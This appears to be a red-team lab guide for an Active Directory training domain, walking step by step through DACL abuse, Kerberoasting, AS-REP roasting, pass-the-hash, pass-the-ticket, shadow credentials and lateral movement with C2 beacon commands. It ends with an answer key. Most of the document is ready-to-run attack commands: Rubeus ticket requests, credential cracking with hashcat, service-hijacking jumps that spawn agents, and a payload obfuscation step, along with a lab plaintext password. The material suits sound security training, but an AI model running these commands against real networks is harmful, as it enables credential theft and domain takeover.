# LAB 8 — Lateral Movement & Domain Compromise

> **Note:** The reference methods below require completing the DACL chain through the Capstone to gain the necessary access. Refer back to them during and after the Capstone as needed.

---

## Task 1 — DACL Abuse Chain

Using the BloodHound attack path identified in LAB 4, exploit DACL permissions starting from `devin.aguirre`. The full path is shown below — Parts 1 and 2 are guided. Continue the chain in the Capstone.

### Part 1 — Establish Token Context

From a beacon on WS01, obtain a token for `devin.aguirre`:
```bash
beacon> token make devin.aguirre 9i*mZrk4Jx8UrIY cheddarsale.local 9
```

#### Adaptix LDAP — Confirm AddMember on RECREATION

Pull the ACL for RECREATION and look for a `WriteProperty` ACE with `ObjectAceType: bf9679c0-0de6-11d0-a285-00aa003049e2` — that GUID is the `member` attribute, so WriteProperty on it equals AddMember:
```bash
beacon> ldap get-usergroups devin.aguirre
beacon> ldap get-acl RECREATION --resolve
```

Note the `--resolve` flag resolves SIDs automatically, but if you encounter a raw SID elsewhere (BloodHound, other tools), look it up with ldapsearch:
```bash
beacon> ldapsearch "(objectSID=<SecurityIdentifier>)" --attributes sAMAccountName,displayName
```

> `bf9679c0-0de6-11d0-a285-00aa003049e2` is the GUID for the `member` attribute — WriteProperty on this GUID grants AddMember rights on the group.

### Part 2 — AddMember: devin.aguirre → RECREATION

- `devin.aguirre` has AddMember directly on RECREATION. Add to the group:
```bash
beacon> ldap add-groupmember RECREATION devin.aguirre
beacon> ldap get-usergroups devin.aguirre
```

> **Troubleshooting:** If `ldap add-groupmember` returns a constraint violation:
>
> **Step 1 — Reset and re-establish the token:**
> ```bash
> beacon> rev2self
> beacon> token make devin.aguirre 9i*mZrk4Jx8UrIY cheddarsale.local 2
> ```
> Or steal the token instead:
> ```bash
> beacon> rev2self
> beacon> token steal <mmc.exe PID>
> ```
>
> **Step 2 — Retry with an alternative method:**
> ```bash
> # SOCKS proxy + bloodyAD from Kali
> proxychains4 bloodyAD -u devin.aguirre -p '9i*mZrk4Jx8UrIY' -d cheddarsale.local -i 192.168.57.10 add groupMember RECREATION devin.aguirre
> ```

Confirm `devin.aguirre` is now a member of **RECREATION**. Using this as a starting point, continue walking the DACL chain in the Capstone using the LDAP BOF commands below.

---

## Task 2 — Kerberos Attacks

### Part 1 — Kerberoasting

- Kerberoasting requests service tickets for accounts with SPNs and cracks them offline. From BloodHound (LAB 4), at least one non-service account is Kerberoastable:
```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe kerberoast /domain:cheddarsale.local /dc:DC01.cheddarsale.local /nowrap /outfile:C:\Users\Public\hashes.txt
beacon> download C:\Users\Public\hashes.txt
```

> **Note:** `/outfile:` saves the hash directly to disk for easy download and cracking. If you want to copy the hash from the beacon console instead, right-click the console output area and enable **No Wrap** — this prevents the hash from being broken across lines, making it easier to select and copy.

- Crack offline — run `dos2unix` first to fix Windows line endings from the downloaded file:
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
dos2unix <hash_file>
hashcat -m 19700 <hash_file> /usr/share/wordlists/rockyou.txt
```

### Part 2 — AS-REP Roasting

AS-REP Roasting targets accounts with Kerberos pre-authentication disabled — no credentials required to request the encrypted blob. The command requires a username, so find AS-REP roastable accounts first via BloodHound or ldapsearch query:

- Roast with kerbeus or Rubeus:
```bash
# kerbeus
beacon> kerbeus asreproasting /user:<user> /domain:cheddarsale.local /dc:DC01.cheddarsale.local /nowrap

# Rubeus — roast a specific user
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe asreproast /user:<user> /domain:cheddarsale.local /dc:DC01.cheddarsale.local /nowrap 

# Rubeus — roast all AS-REP roastable users at once
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe asreproast /domain:cheddarsale.local /dc:DC01.cheddarsale.local /nowrap /outfile:C:\Users\Public\asrep.txt
```

- Download and crack AS-REP hashes


### Part 3 — Request and List Tickets

- Request a TGT for `devin.aguirre` using plaintext credentials and inspect it:
```bash
beacon> kerbeus asktgt /user:devin.aguirre /password:9i*mZrk4Jx8UrIY /domain:cheddarsale.local /dc:DC01.cheddarsale.local
beacon> kerbeus klist
```

- Or request using an NTLM hash (Pass-the-Key / Overpass-the-Hash):
```bash
beacon> kerbeus asktgt /user:devin.aguirre /rc4:<NTLM_HASH> /domain:cheddarsale.local /dc:DC01.cheddarsale.local
beacon> kerbeus klist
```

- Or request using an AES256 hash (stealthier — avoids RC4 downgrade detection):
```bash
beacon> kerbeus asktgt /user:devin.aguirre /aes256:<AES256_HASH> /domain:cheddarsale.local /dc:DC01.cheddarsale.local /opsec
beacon> kerbeus klist
```

- Rubeus equivalents:
```bash
# Plaintext
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe asktgt /user:devin.aguirre /password:9i*mZrk4Jx8UrIY /domain:cheddarsale.local /dc:DC01.cheddarsale.local /nowrap

# NTLM hash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe asktgt /user:devin.aguirre /rc4:<NTLM_HASH> /domain:cheddarsale.local /dc:DC01.cheddarsale.local /nowrap

# AES256 hash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe asktgt /user:devin.aguirre /aes256:<AES256_HASH> /domain:cheddarsale.local /dc:DC01.cheddarsale.local /opsec /nowrap

# List tickets
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe triage
```

- Request a TGS for CIFS on DC01. The `<BASE64_TGT>` comes from the `asktgt` output above — copy the base64 blob from the Rubeus `/nowrap` output, or add `/ptt` to `asktgt` to inject it automatically and skip the manual pass:
```bash
# kerbeus — request TGS using an existing TGT
beacon> kerbeus asktgs /service:cifs/DC01.cheddarsale.local /domain:cheddarsale.local /dc:DC01.cheddarsale.local /ticket:<BASE64_TGT>
beacon> kerbeus klist

# Rubeus — request and inject TGS in one step
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe asktgs /service:cifs/DC01.cheddarsale.local /user:devin.aguirre /domain:cheddarsale.local /dc:DC01.cheddarsale.local /ticket:<BASE64_TGT> /ptt /nowrap
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe triage
```

---

## Reference Methods

The following methods below are for reference. Use them during the Capstone as access permits.

---

## Pass-the-Hash

Use the NTLM hash extracted via pypykatz in LAB 7 to authenticate without the plaintext password.

### Part 1 — netexec via SOCKS Proxy

Test access to DC01 through the SOCKS proxy from LAB 6:
```bash
proxychains4 netexec smb DC01 -u devin.aguirre -H <NTLM_HASH>
```

### Part 2 — Overpass-the-Hash with Rubeus

Use the NTLM hash to request a Kerberos TGT and inject it directly into the session (Overpass-the-Hash):
```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe asktgt /user:devin.aguirre /rc4:<NTLM_HASH> /domain:cheddarsale.local /ptt
beacon> kerbeus klist
```

---

## Pass-the-Ticket

Submit a Kerberos ticket into the current session for use in subsequent authentication.

### Part 1 — Request and Pass with Kerbeus

Request a TGT using plaintext credentials and inject it:
```bash
beacon> kerbeus asktgt /user:devin.aguirre /password:9i*mZrk4Jx8UrIY /domain:cheddarsale.local /dc:DC01.cheddarsale.local
beacon> kerbeus ptt <ticket_file>
beacon> kerbeus klist
```

### Part 2 — Dump and Pass with Rubeus

Dump tickets from memory, then inject a specific ticket:
```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe dump /nowrap
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe ptt /ticket:<base64_ticket>
beacon> kerbeus klist
```

---

## Shadow Credentials with Whisker

Shadow Credentials abuse the `msDS-KeyCredentialLink` attribute to add a certificate to a target account. Once added, the certificate can be used to request a TGT via PKINIT — no password required. This requires Write access to the attribute (GenericAll, GenericWrite, or direct attribute write permission) and an AD CS environment. DC01 is the CA in this lab.

> **Note:** This technique fits into the DACL chain — `alec.jarvis` has AddKeyCredentialLink on `clinton.stewart`, enabling shadow credential injection without a password reset.

### Part 1 — List and Add Shadow Credential

Check for existing shadow credentials on the target, then add a new one:
```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Whisker.exe list /target:<TARGET_USER>
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Whisker.exe add /target:<TARGET_USER>
```

Whisker outputs a ready-to-run Rubeus command containing the generated certificate and password — copy it for the next step.

### Part 2 — Authenticate with the Certificate

Use the Rubeus command from Whisker's output to request a TGT using the certificate. Add `/getcredentials` to also recover the NTLM hash via U2U:
```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Rubeus.exe asktgt /user:<TARGET_USER> /certificate:<base64_cert> /password:<cert_password> /domain:cheddarsale.local /dc:DC01.cheddarsale.local /getcredentials /ptt /nowrap
beacon> kerbeus klist
```

The NTLM hash in the output can be used directly for Pass-the-Hash.

### Part 3 — Clean Up

Remove the shadow credential using the device ID printed by Whisker:
```bash
beacon> execute-assembly /opt/sharpcollection/NetFramework_4.5_x64/Whisker.exe remove /target:<TARGET_USER> /deviceid:<device_id>
```

---

## Remote Execution

Use compromised credentials with lateral movement BOFs to spawn sessions or execute commands on remote hosts. All methods require local admin rights on the target — confirm access first:
```bash
proxychains4 netexec smb 192.168.57.10 -u devin.aguirre -p "9i*mZrk4Jx8UrIY"
```

> **Note:** `jump` commands spawn a new agent session on the target using the `svc_agent_tcp9001.x64.exe` service binary. Process it with Beatrice first if not already done:
> ```bash
> cd /opt/beatrice && source .venv/bin/activate
> python3 beatrice.py ~/AdaptixProjects/<YOUR PROJECT>/Payloads/svc_agent_tcp9001.x64.exe
> deactivate
> ```
> After a `jump` succeeds, link to the new session via TCP.

### Part 1 — PsExec (jump psexec)

Uploads a service binary to the target, creates a new service, and spawns an agent:
```bash
beacon> jump psexec 192.168.57.10 ~/AdaptixProjects/<YOUR PROJECT>/Payloads/svc_agent_tcp9001.x64.exe -b update.exe -s ADMIN$ -p C:\Windows -n UpdateService -d "Windows Update Service"
beacon> link tcp 192.168.57.10 9001
```

### Part 2 — SCShell via Jump (jump scshell)

Uploads a service binary and hijacks an existing service binary path instead of creating a new service:
```bash
beacon> jump scshell 192.168.57.10 ~/AdaptixProjects/<YOUR PROJECT>/Payloads/svc_agent_tcp9001.x64.exe -b update.exe -s ADMIN$ -p C:\Windows -n defragsvc
beacon> link tcp 192.168.57.10 9001
```

### Part 3 — WinRM (invoke winrm)

Execute a command on the target via WinRM using explicit credentials — no session is spawned:
```bash
beacon> invoke winrm 192.168.57.10 "whoami /all" -u cheddarsale\\devin.aguirre -p "9i*mZrk4Jx8UrIY"
```

### Part 4 — SCShell Fileless (invoke scshell)

Modify an existing service's binary path to execute a command without uploading a file — no new service is created:
```bash
beacon> invoke scshell 192.168.57.10 defragsvc "cmd.exe /c whoami > C:\Windows\Temp\out.txt"
```

---

## Answers

<details>
<summary>Task 1</summary>

- Kerberoastable non-service account (identified in LAB 4): Carmen Bolton
- GenericAll on a computer object enables: RBCD abuse or Shadow Credentials — both allow impersonating the machine account to perform DCSync

</details>

---

<details>
<summary>Task 2</summary>

#### Part 1 — Kerberoasting

`kerbeus kerberoasting` requires an SPN — find it first from BloodHound or ldap, then pass it directly:

```bash
beacon> ldapsearch (&(objectCategory=Person)(objectClass=User)(servicePrincipalName=*)) --attributes cn,servicePrincipalName
```

Copy the SPN from the output (e.g. `MSSQLSvc/srv01.cheddarsale.local:1433`), then request the ticket:

```bash
beacon> kerbeus kerberoasting /spn:CIFS/maintenance.cheddarsale.local /dc:DC01.cheddarsale.local /domain:cheddarsale.local
```

The output is a Kerberos 5 TGS hash (`$krb5tgs$23$*...`). Save it and crack offline:

```bash
hashcat -m 13100 <hash_file> /usr/share/wordlists/rockyou.txt
```

- Kerberoastable user: Carmen Bolton
- AS-REP Roastable accounts: users with `DONT_REQ_PREAUTH` UAC flag set
- ldapsearch query to find AS-REP roastable accounts:

```bash
beacon> ldapsearch (&(objectCategory=Person)(objectClass=User)(userAccountControl:1.2.840.113556.1.4.803:=4194304)) --attributes cn
```

</details>

---

